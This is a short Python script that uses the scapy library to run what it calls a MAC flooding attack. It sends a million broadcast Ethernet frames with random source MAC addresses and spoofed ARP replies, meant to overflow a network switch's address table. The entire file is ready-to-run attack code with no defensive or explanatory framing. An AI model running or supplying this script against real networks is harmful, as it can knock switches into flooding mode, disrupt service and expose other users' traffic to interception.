import random 
from scapy.all import *

print('starting MAC flooding attack...')

def Hex():
    return random.choice(['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'])

def generateMac():
    return '%s%s:%s%s:%s%s:%s%s:%s%s:%s%s' % (Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex(),Hex())

for i in range(1000000):
    mac = generateMac()
    print('iteration %s' % i)
    print('  Sending MAC: ', mac)
    sendp(Ether(src=mac,dst="FF:FF:FF:FF:FF:FF")/ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18))

print('exiting program')